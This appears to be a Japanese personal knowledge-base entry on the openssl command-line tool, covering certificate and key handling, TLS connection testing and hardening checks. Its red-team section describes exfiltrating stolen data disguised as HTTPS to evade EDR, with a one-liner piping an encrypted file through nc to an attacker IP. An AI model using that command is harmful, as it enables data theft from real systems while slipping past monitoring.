---
# --- YAML Frontmatter ---
created: 2026-02-23 09:13
modified: 2026-02-23 09:52
environment: [OS/Linux, OS/Unix, OS/macOS, Networking]
vulnearability: [Heartbleed, Man-in-the-Middle, Certificate_Forgery]
knowledge_category: Command
tags:
  - openssl
  - cryptography
  - pki
  - security
  - tls
  - knowledge_base
---

# Command - Linux - openssl - 暗号化・証明書・SSL/TLS 管理ツール

## 概要

`openssl` は、OpenSSL ライブラリの様々な暗号機能をコマンドラインから利用するためのツールキットです。データの暗号化、ハッシュ計算、デジタル証明書 (X.509) の作成、SSL/TLS サーバーのテストなど、情報セキュリティのほぼすべての領域をカバーします。

## 🛠 主要なサブコマンド (機能別)

`openssl` はそれ自体が巨大なフレームワークであり、目的の「サブコマンド」を選んで使用します。

| サブコマンド | 役割 | よく使う例 |
| :--- | :--- | :--- |
| **`genrsa`** | RSA 秘密鍵の生成 | `openssl genrsa -out server.key 2048` |
| **`req`** | 証明書署名要求 (CSR) の作成 | `openssl req -new -key server.key -out server.csr` |
| **`x509`** | 証明書の表示・署名・変換 | `openssl x509 -in cert.pem -text -noout` |
| **`s_client`** | SSL/TLS クライアントとして接続 | `openssl s_client -connect google.com:443` |
| **`enc`** | 共通鍵暗号（AES等）による暗号化 | `openssl enc -aes-256-cbc -in file.txt` |
| **`dgst`** | ハッシュ値の計算 | `openssl dgst -sha256 file.txt` |

---

## 💡 鉄板の活用レシピ

### 1. 「この証明書、いつ切れる？」の確認

```bash
# 証明書の有効期限だけをサクッと確認
openssl x509 -in server.crt -noout -dates
````

### 2. 「HTTPS の接続テスト」と情報のぶっこ抜き

`telnet` では不可能な暗号化通信のデバッグに。

Bash

```
# 接続して証明書の詳細やサーバー情報を表示
openssl s_client -connect example.com:443 -showcerts
```

---

## 業務シナリオ別活用法

### 1. インフラ構築・運用視点

- **タスク**: SSL 証明書の更新作業。
- **解説**: 秘密鍵を作成し、CSR を生成して認証局に送り、届いた証明書をウェブサーバー（Nginx/Apache）に組み込みます。また、証明書の形式変換（PEM ↔ PFX 等）も `openssl` の独壇場です。

### 2. ブルーチーム視点

- **タスク**: 暗号設定の脆弱性診断（Hardening）。
- **解説**: `s_client` を使い、自社のサーバーが古い TLS プロトコル (TLS 1.0/1.1) や、脆弱な暗号スイート（RC4 等）を許可していないか確認します。
- **例**:

    Bash

    ```
    # 特定のプロトコルを指定して接続を試行し、拒否されるか確認
    openssl s_client -connect target.com:443 -tls1_1
    ```

### 3. レッドチーム視点

- **タスク**: 暗号化された通信路の確保（Exfiltration）。
- **解説**: 侵入後、盗み出したデータを `nc` で送ると EDR 等に検知されることがありますが、`openssl` を使って通信を暗号化（HTTPS に偽装）することで、監視を潜り抜けて外部にデータを送り出します。
- **例**:

    Bash

    ```
    # 攻撃者の待ち受けサーバーに暗号化してファイルを送信
    openssl enc -aes-256-cbc -salt -in data.zip | nc <attacker_ip> 443
    ```

---

## セキュリティに関する考慮事項

### 脆弱性とリスク

- **Heartbleed (CVE-2014-0160)**: 歴史的な脆弱性。OpenSSL のバグにより、メモリ上の機密情報が漏洩するリスクがありました。
- **秘密鍵の管理**: `openssl` で作成した秘密鍵 (`.key`) のパーミッションが適切でない（例: 644 など）場合、他のユーザーに盗まれる致命的な事故に繋がります。

### 対応策・緩和策 (ブルーチーム視点)

- **常に最新版を**: セキュリティホールが見つかりやすいライブラリであるため、常に OS パッチを適用して最新の `openssl` を保つことが絶対条件です。
- **鍵のパーミッション設定**: 秘密鍵を作成した直後に `chmod 600` を徹底します。

## 注意点・補足

- **対話型プロンプトの回避**: スクリプト等で `openssl req` を自動化したい場合は、`-subj` オプションを使って国名や組織名を一括で渡すと便利です。

